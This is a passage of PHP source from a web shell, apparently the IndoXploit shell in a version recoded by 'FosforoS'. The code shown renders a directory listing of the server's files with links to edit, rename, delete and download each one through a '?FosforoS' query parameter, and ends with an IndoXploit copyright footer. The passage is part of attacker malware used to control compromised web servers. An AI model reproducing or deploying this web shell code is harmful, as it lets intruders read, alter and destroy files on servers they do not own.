fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?FosforoS&act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?FosforoS&act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?FosforoS&act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?FosforoS&act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?FosforoS&act=download&dir=$dir&file=$dir/$file'>download</a></td>";
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		} else {
			echo "<hr>";
		}
	echo "<center><font color=red>Copyright &copy; ".date("Y")." - <a href='http://indoxploit.or.id/' target='_blank'><font color=red>IndoXploit</a> | Recode by FosforoS</font></center>";
}}
?>
</html>
